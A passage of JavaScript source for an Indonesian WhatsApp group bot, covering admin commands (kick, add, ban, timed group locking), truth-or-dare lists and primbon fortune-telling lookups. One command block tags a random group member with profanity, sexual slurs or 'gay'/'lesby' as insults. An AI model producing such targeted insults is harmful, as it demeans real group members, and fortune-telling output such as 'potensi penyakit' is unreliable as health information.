await atak.groupParticipantsUpdate(from, [Input], 'remove').then((res) => setReply(`Berhasil mengeluarkan  ${Input.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err))) 
}
break
case 'add': {
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if(!Input) return setReply("Tag/Mention/Masukan nomer target")
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
await atak.groupParticipantsUpdate(from, [Input], 'add').then((res) => setReply(`Berhasil menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err))) 
}
break
case 'demote': {
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
await atak.groupParticipantsUpdate(from, [users], 'demote').then((res) => setReply(`Sukses Demote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'admin': case 'promote': {
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
await atak.groupParticipantsUpdate(from, [users], 'promote').then((res) => setReply(`Sukses Promote ${users}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'closetime': 
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
var nomor = ridho.participant
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
atak.groupSettingUpdate(from, 'announcement')
setReply(close)
}, timer)
break
case 'opentime':        
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
var nomor = ridho.participant
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
atak.groupSettingUpdate(from, 'not_announcement')
setReply(open)
}, timer)
break
case 'kickme':
try{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup() 
await atak.groupParticipantsUpdate(from, [sender], 'remove')
await setReply("Done wkwkw")
} catch (err){
setReply(`${err}`)
}
break
case 'banchat':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if (isBanchat) return setReply(`udah di ban`)
addDataId(from, command, DataId)
setReply(`Bot berhasil Ban di group ini`)
}
break
case 'unbanchat':
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
try {
if (!isBanchat) return setReply(`udah di UnBan`)
removeDataId ("banchat", from, DataId)
setReply(`Bot telah di Unban di group ini`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break
case 'ban':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
let Name = await atak.getName(woke)
console.log(woke)
if(cekBannedUser (woke, ban)) return setReply("Udah di ban kak")
addBanned(Name,calender,  woke, ban)          
setReply( `Berhasil banned ${woke}`);
} else  if(users){
let Nomer =`${users.split("@")[0]}`
if(cekBannedUser (Nomer, ban)) return setReply("Udah di ban kak")
let Name = await atak.getName(users)
addBanned(Name,calender,  Nomer, ban)               
setReply( `Berhasil banned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break
case 'unban':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
if(!cekBannedUser (woke, ban)) return setReply("Udah di unban kak")
unBanned (woke, ban)             
setReply( `Berhasil unbanned ${woke}`);
} else  if(users){
let Nomer =`${users.split("@")[0]}`
if(!cekBannedUser (Nomer, ban)) return setReply("Udah di unban kak")
unBanned (Nomer, ban)             
setReply( `Berhasil unbanned ${users.split("@")[0]}`);
} else setReply('Reply atau tag targetnya')
}
break
case 'getppgc':
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup() 
onlyWait()
try {
var ppimg = await atak.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await atak.sendMessage(from, { image: { url: ppimg }}, { quoted: ridho })
break 
case 'getpp':
if (!isRegist) return onlyRegist()
if (isGroup) { 
if(mentionByTag){
console.log(mentionByTag[0])
try {
var ppimg = await atak.profilePictureUrl(mentionByTag[0],"image")
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await atak.sendMessage(from, { caption: "Nih", image: { url: ppimg }}, { quoted: ridho })

} else if (mentionByReply){
try {
var ppimg = await atak.profilePictureUrl(mentionByReply, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await atak.sendMessage(from, { contextInfo: { forwardingScore: 2, isForwarded: true },caption: "Nih", image: { url: ppimg }}, { quoted: ridho })
} 
} else if(!isGroup){
try {
var ppimg = await atak.profilePictureUrl(from, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await atak.sendMessage(from, {caption: "Nih",  image: { url: ppimg }}, { quoted: ridho })
}
break
case 'getname':
if (!isRegist) return onlyRegist()
if(isGroup) {
console.log(users)
const sname = await atak.getName(users)
setReply(sname)
} else if(!isGroup) {
const yahu = await atak.getName(users)
setReply(yahu)
} else{
setReply("Reply targetnya")
}
break
case 'listonline': {
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup() 
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
atak.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, ridho, { mentions: online })
}
break
case 'getidgc':
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup() 
setReply(`${from}`)
break
//================================================================================\\
case 'ngewe':
case 'memek':
case 'bego':
case 'goblok':
case 'janda':
case 'perawan':
case 'babi':
case 'tolol':
case 'pinter':
case 'pintar':
case 'asu':
case 'bodoh':
case 'gay':
case 'lesby':
case 'bajingan':
case 'jancok':
case 'anjing':
case 'ngentod':
case 'ngentot':
case 'monyet':
case 'mastah':
case 'newbie':
case 'bangsat':
case 'bangke':
case 'sange':
case 'sangean':
case 'dakjal':
case 'horny':
case 'wibu':
case 'puki':
case 'pantex':
case 'pantek': {
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup() 
let member = participants.map(u => u.id)
let org = member[Math.floor(Math.random() * member.length)]
atak.sendMessage(from, { text: `yang paling ${command} di sini adalah @${org.split("@")[0]}`, mentions: [org]}, { quoted: setQuoted }) 
}
break
case 'jadian': {
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup() 
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee Yang Jadian💖 Jangan Lupa Pajak Jadiannya Yaa🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
atak.sendMessage(from, { text: jawab, mentions: menst }) 
}
break
//================================================================================\\
case 'cekbapak':
if (!isRegist) return onlyRegist() 
const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
const cek = bapak[Math.floor(Math.random() * bapak.length)]
setReply(cek)
break
case 'bucin':
if (!isRegist) return onlyRegist() 
const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
atak.sendMessage(from, { text: ''+sa+'\n\n_-BUCIN._'}, { quoted: setQuoted })
break
case 'katailham':  
if (!isRegist) return onlyRegist() 
const afa = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
atak.sendMessage(from, { text: ''+afa+'\n\n_-Ilham._'}, { quoted: setQuoted })
break
case 'truth':
if (!isRegist) return onlyRegist() 
const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
setReply(ttrth) 
break
case 'dare':
if (!isRegist) return onlyRegist() 
const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
setReply(der) 
break
case 'bisakah':
if (!isRegist) return onlyRegist() 
const bisakah = body.slice(1)
const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
atak.sendMessage(from, { text: 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh }, { quoted: setQuoted })
break
case 'kapankah':
if (!isRegist) return onlyRegist() 
const kapankah = body.slice(1)
const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
atak.sendMessage(from, { text: 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh}, { quoted: setQuoted })
break
case 'apakah':
if (!isRegist) return onlyRegist() 
const apakah = body.slice(1)
const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
const kah = apa[Math.floor(Math.random() * apa.length)]
atak.sendMessage(from, { text: 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah}, { quoted: setQuoted })
break
case 'bagaimanakah':
if (!isRegist) return onlyRegist() 
const bagaimanakah = body.slice(1)
const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
const mana = bagai[Math.floor(Math.random() * bagai.length)]
atak.sendMessage(from, { text: 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana}, { quoted: setQuoted })
break													
case 'goblokcek': case 'jelekcek': case 'gaycek':case 'rate':
case 'lesbicek':case 'gantengcek': case 'cantikcek':case 'begocek': case 'suhucek':case 'pintercek':
case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek':
case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek':
case 'pakgirlcek':case 'sangecek': case 'bapercek':case 'fakboycek':case 'alimcek':case 'suhucek':
case 'fakgirlcek':case 'kerencek':case 'wibucek':case 'pasarkascek':
if (!isRegist) return onlyRegist() 
const cex = body.slice(1)
const cek1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
atak.sendMessage(from, { text: 'Pertanyaan : *'+cex+'*\n\nJawaban : '+ cek2+'%'}, { quoted: setQuoted })
break			
case 'watakcek': case 'cekwatak':
if (!isRegist) return onlyRegist() 
const watak = body.slice(1)
const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
const tak = wa[Math.floor(Math.random() * wa.length)]
atak.sendMessage(from, { text: 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak}, { quoted: setQuoted })
break				
case 'hobbycek': case 'cekhobby':
if (!isRegist) return onlyRegist() 
const hobby = body.slice(1)
const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
atak.sendMessage(from, { text: 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by}, { quoted: setQuoted })
break
//================================================================================\\
case 'nomerhoki': case 'nomorhoki': {
if (!q) return setReply(`Example : ${prefix + command} 6288292024190`) 
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`}, {quoted: setQuoted}) 
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (!q) return setReply(`Example : ${prefix + command} belanja`) 
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`}, {quoted: setQuoted}) 
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'suamiistri': {
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'ramalancinta': case 'ramalcinta': {
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'artinama': {
if (!q) return setReply(`Example : ${prefix + command} Dika Ardianta`) 
let anu = await primbon.arti_nama(text)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'kecocokannama': case 'cocoknama': {
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`}, {quoted: setQuoted}) 
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!q) return setReply(`Example : ${prefix + command} Dika|Novia`) 
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { image: { url: anu.message.gambar }, caption: `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}` }, { quoted: setQuoted })
}
break
case 'sifatusaha': {
if (!q) return setReply(`Example : ${prefix+ command} 28, 12, 2021`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`}, {quoted: setQuoted}) 
}
break
case 'rejeki': case 'rezeki': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'pekerjaan': case 'kerja': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`}, {quoted: setQuoted}) 
}
break
case 'potensipenyakit': case 'penyakit': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'fengshui': {
if (!q) return setReply(`Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`) 
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`}, {quoted: setQuoted}) 
}
break
case 'haribaik': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'harisangar': case 'taliwangke': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'harinaas': case 'harisial': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`}, {quoted: setQuoted}) 
}
break
case 'nagahari': case 'harinaga': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
atak.sendMessage(from, { text:`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'arahrejeki': case 'arahrezeki': {
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
